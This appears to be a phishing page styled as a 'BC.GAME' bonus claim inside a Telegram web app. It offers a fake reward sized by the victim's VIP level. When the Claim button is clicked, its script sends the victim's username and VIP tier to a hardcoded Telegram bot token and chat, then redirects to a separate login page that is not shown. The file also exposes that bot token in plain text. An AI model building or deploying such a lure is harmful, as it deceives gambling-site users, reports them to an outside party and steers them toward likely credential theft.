<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BC.GAME Claim</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            min-height: 100%;
        }

        body {
            min-height: 100vh;
            min-height: 100dvh;
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #fff;
            background-image: url("https://hash.game/assets/pwa-CUqa7I_R.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            overflow: hidden;
        }

        .page {
            position: relative;
            min-height: 100vh;
            min-height: 100dvh;
            display: grid;
            place-items: center;
            padding: 24px;
        }

        .page::before {
            content: "";
            position: fixed;
            inset: 0;
            background:
                radial-gradient(circle at 50% 45%, rgba(255, 215, 120, 0.2), transparent 36%),
                linear-gradient(180deg, rgba(6, 10, 12, 0.22), rgba(6, 10, 12, 0.72));
            pointer-events: none;
        }

        .claim-box {
            position: relative;
            z-index: 1;
            width: min(92vw, 390px);
            min-height: 386px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 18px;
            padding: 34px 26px 28px;
            text-align: center;
            background: rgba(12, 17, 20, 0.78);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.48);
            backdrop-filter: blur(16px);
            overflow: hidden;
            transform-origin: center;
            animation: claimBoxIn 720ms cubic-bezier(0.16, 1, 0.3, 1) both;
        }

        .claim-box::before {
            content: "";
            position: absolute;
            inset: 0;
            background: linear-gradient(120deg, transparent 18%, rgba(255, 255, 255, 0.12) 42%, transparent 66%);
            transform: translateX(-130%);
            animation: shine 3.8s ease-in-out 900ms infinite;
            pointer-events: none;
        }

        .claim-mark {
            width: 68px;
            height: 68px;
            display: grid;
            place-items: center;
            border-radius: 50%;
            background: linear-gradient(145deg, #ffdc67, #f0a928);
            box-shadow: 0 12px 30px rgba(240, 169, 40, 0.32);
            color: #1b1405;
            font-size: 34px;
            font-weight: 900;
            line-height: 1;
            animation: floatMark 2.6s ease-in-out infinite;
        }

        .eyebrow {
            color: #ffe7a3;
            font-size: 12px;
            font-weight: 800;
            letter-spacing: 0;
            text-transform: uppercase;
        }

        h1 {
            max-width: 300px;
            font-size: clamp(28px, 8vw, 40px);
            line-height: 1.02;
            font-weight: 900;
            letter-spacing: 0;
        }

        .reward {
            min-width: 180px;
            padding: 12px 18px;
            border-radius: 8px;
            background: rgba(255, 220, 103, 0.14);
            border: 1px solid rgba(255, 220, 103, 0.4);
            color: #ffdc67;
            font-size: clamp(46px, 16vw, 68px);
            line-height: 1;
            font-weight: 900;
            text-shadow: 0 4px 26px rgba(255, 220, 103, 0.25);
        }

        .claim-copy {
            max-width: 290px;
            color: rgba(255, 255, 255, 0.82);
            font-size: 15px;
            line-height: 1.45;
        }

        .claim-button {
            position: relative;
            width: 100%;
            min-height: 54px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            border: 0;
            border-radius: 8px;
            background: linear-gradient(135deg, #ffe06b, #f2aa2d);
            color: #17110a;
            font-size: 18px;
            font-weight: 900;
            letter-spacing: 0;
            cursor: pointer;
            box-shadow: 0 12px 30px rgba(242, 170, 45, 0.34);
            transition: transform 180ms ease, box-shadow 180ms ease, opacity 180ms ease;
        }

        .claim-button:active {
            transform: translateY(1px) scale(0.99);
            box-shadow: 0 8px 22px rgba(242, 170, 45, 0.28);
        }

        .claim-button:disabled {
            cursor: wait;
            opacity: 0.88;
        }

        .button-spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(23, 17, 10, 0.28);
            border-top-color: #17110a;
            border-radius: 50%;
            animation: spin 800ms linear infinite;
        }

        .claim-button.loading .button-spinner {
            display: block;
        }

        .status {
            min-height: 18px;
            color: rgba(255, 255, 255, 0.72);
            font-size: 13px;
            opacity: 0;
            transform: translateY(6px);
            transition: opacity 200ms ease, transform 200ms ease;
        }

        .status.show {
            opacity: 1;
            transform: translateY(0);
        }

        @keyframes claimBoxIn {
            from {
                opacity: 0;
                transform: translateY(28px) scale(0.96);
                filter: blur(6px);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
                filter: blur(0);
            }
        }

        @keyframes shine {
            0%, 58% {
                transform: translateX(-130%);
            }
            100% {
                transform: translateX(130%);
            }
        }

        @keyframes floatMark {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-5px);
            }
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 420px) {
            .page {
                padding: 16px;
            }

            .claim-box {
                min-height: 360px;
                padding: 30px 20px 24px;
            }

            .claim-mark {
                width: 60px;
                height: 60px;
                font-size: 30px;
            }
        }

        @media (prefers-reduced-motion: reduce) {
            *,
            *::before,
            *::after {
                animation-duration: 1ms !important;
                animation-iteration-count: 1 !important;
                scroll-behavior: auto !important;
                transition-duration: 1ms !important;
            }
        }
    </style>
</head>
<body>
    <main class="page">
        <section class="claim-box" aria-labelledby="claim-title">
            <div class="claim-mark" aria-hidden="true">$</div>
            <p class="eyebrow">Exclusive Reward</p>
            <h1 id="claim-title">Reward Ready</h1>
            <div id="reward-amount" class="reward">$10</div>
            <p class="claim-copy">Your bonus has been unlocked and is ready to claim.</p>
            <button id="claim-button" class="claim-button" type="button">
                <span class="button-spinner" aria-hidden="true"></span>
                <span id="button-text">Claim</span>
            </button>
            <div id="claim-status" class="status" aria-live="polite"></div>
        </section>
    </main>

    <script>
        const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        const TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";
        const TELEGRAM_CHAT_ID = "-5244196921";
        const REWARDS = {
            Bronze: "$20",
            Silver: "$100",
            Gold: "$500",
            Platinum: "$1000",
            Diamond: "$5000",
        };

        const params = new URLSearchParams(window.location.search);
        const username = normalizeUsername(params.get("username"));
        const vipLevel = normalizeVip(params.get("vip"));
        const rewardAmount = REWARDS[vipLevel] || "$10";

        const rewardEl = document.getElementById("reward-amount");
        const claimButton = document.getElementById("claim-button");
        const buttonText = document.getElementById("button-text");
        const statusEl = document.getElementById("claim-status");
        let claimInProgress = false;

        rewardEl.textContent = rewardAmount;
        claimButton.addEventListener("click", claimBonus);

        function normalizeUsername(value) {
            const clean = String(value || "Unknown").trim().replace(/^@+/, "");
            return clean || "Unknown";
        }

        function normalizeVip(value) {
            const vip = String(value || "").trim().toLowerCase();
            if (vip === "diamond" || vip.includes("svip")) return "Diamond";
            if (vip === "platinum") return "Platinum";
            if (vip === "gold") return "Gold";
            if (vip === "silver") return "Silver";
            if (vip === "bronze") return "Bronze";
            return "Unknown";
        }

        function wait(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function sendClaimToTelegram() {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const message = `${username} (${vipLevel}) clicked claim`;

            await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                }),
            });
        }

        async function claimBonus() {
            if (claimInProgress) return;
            claimInProgress = true;

            claimButton.disabled = true;
            claimButton.classList.add("loading");
            buttonText.textContent = "Claiming...";
            statusEl.textContent = "Processing your claim...";
            statusEl.classList.add("show");

            try {
                await sendClaimToTelegram();
            } catch (error) {
                console.error("Claim notification failed:", error);
            }

            statusEl.textContent = "Redirecting...";
            await wait(850);
            const loginParams = new URLSearchParams({
                username,
                vip: vipLevel,
            });
            window.location.href = `login.html?${loginParams.toString()}`;
        }
    </script>
</body>
</html>
